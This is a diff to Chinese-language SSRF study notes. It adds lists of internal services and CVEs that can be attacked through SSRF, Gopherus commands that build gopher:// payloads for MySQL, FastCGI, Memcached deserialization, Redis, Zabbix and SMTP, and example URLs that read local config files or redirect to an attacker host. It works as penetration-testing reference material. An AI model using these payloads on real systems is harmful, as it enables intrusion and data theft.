@@ -55,7 +55,8 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
       * AWS(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978))
       * Google Cloud
   * 攻击内网其他主机
-    * 高危漏洞(SQLi、Struts2、Redis未授权、MongoDB未授权...)
+    * web类:SQLi、PHP FastCGI RCE、Struts2 RCE、Confluence Unauthorized RCE(CVE-2019-3396)、Jenkins插件RCE（CVE-2019-1003000  CVE-2019-1003001  CVE-2019-1003002)...
+    * 其他服务:Redis未授权/弱口令导致RCE、MongoDB未授权/弱口令可获取数据、MySQL未授权/弱口令可获取数据、Memcached未授权/弱口令可获取数据可RCE...
   * 读取文件
     * 类型1 支持了URL Schema(file等协议)
       * 实例 `/click.jsp?url=http://127.0.0.1:8082/config/dbconfig.xml` [21CN某站SSRF(可读取本地数据库配置文件、探测内网)](https://www.secpulse.com/archives/29452.html)
@@ -83,9 +84,26 @@ SSRFserver -> attacker      【4】程序逻辑如果将req2的真实响应内�
   * `gopher://` Gopher是一种分布式文档传递服务
     * `http://example.com/ssrf.php?url=http://attacker.com/gopher.php`
 
-### 测试方法及原理 - 以gopher为例
+如果存在SSRF漏洞，可利用[Gopherus](https://github.com/tarunkant/Gopherus)生成包含payload的`gopher://`链接，利用SSRF漏洞进行攻击.
 
-前提：存在SSRF漏洞的web后端所在的服务器必须支持gopher协议，攻击者构造http请求中的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。
+* 目前该工具支持的payload类型:
+  * MySQL (Port-3306) `gopherus --exploit mysql` 利用方式1:获取数据.  利用方式2:利用MySQL写入文件.
+  * FastCGI (Port-9000)`gopherus --exploit fastcgi` PHP FastCGI RCE. 利用条件:端口9000开放且未配置身份认证.
+  * Memcached (Port-11211)
+    * Python-Pickle De-serialization `gopherus --exploit pymemcache`
+    * PHP De-serialization `gopherus --exploit phpmemcache`
+    * Ruby-Marshal De-serialization `gopherus --exploit rbmemcache`
+    * dumping Memcached content  `gopherus --exploit dmpmemcache`
+  * Redis (Port-6379)`gopherus --exploit redis`
+  * Zabbix (Port-10050)`gopherus --exploit zabbix` 利用条件:Zabbix服务器开放了10050端口并配置了`EnableRemoteCommands = 1` 则可执行shell命令
+  * SMTP (Port-25)`gopherus --exploit smtp`  利用开放的SMTP端口发送邮件
+
+
+### 测试原理
+
+前提：存在SSRF漏洞的web后端所在的服务器必须支持gopher协议.
+
+攻击者构造http请求中如`gopher://`的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。
 
 先在攻击者公网主机test2.com上监听1337端口，看一会能否收到数据:
 ```
